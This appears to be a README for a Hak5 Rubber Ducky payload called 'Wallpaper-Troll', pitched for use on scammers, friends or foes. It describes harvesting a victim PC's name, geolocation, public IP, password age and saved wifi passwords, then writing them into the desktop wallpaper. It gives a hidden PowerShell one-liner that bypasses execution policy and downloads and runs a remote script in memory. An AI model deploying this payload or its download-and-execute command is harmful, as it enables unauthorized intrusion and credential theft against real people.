##

<!-- TABLE OF CONTENTS -->
<!--TABLE 0F C0NTENTS-->

# Wallpaper-Troll

A script I put together to torment Call Center Scammers but can be used on your friends as well...or foes.

## Description

This program enumerates a target PC to get their Name, GeoLocation (Latitude and Longitude), Public IP, Day password was last set, and wifi passwords. This information will be saved to a file that is then converted to a .BMP image. That image will be saved to their desktop and saved as their wallpaper. Opening the image on their desktop with NotePad will reveal the binary code with a hidden message at the bottom of the file.

![alt text](https://github.com/M3!/hak5-submissions/blob/main/RubberDucky/Payloads/RD-Wallpaper-Troll/wp-troll.jpg)

## Getting Started

### Dependencies

* Windows 10,11

##

### Executing program

* Plug in your device
* Invoke-RestMethod will be entered in the Run Box to download and execute the script from memory
```
powershell -w h -NoP -NonI -Ep Bypass irm MYDOMAIN.HERE/b8n | iex
```

##

##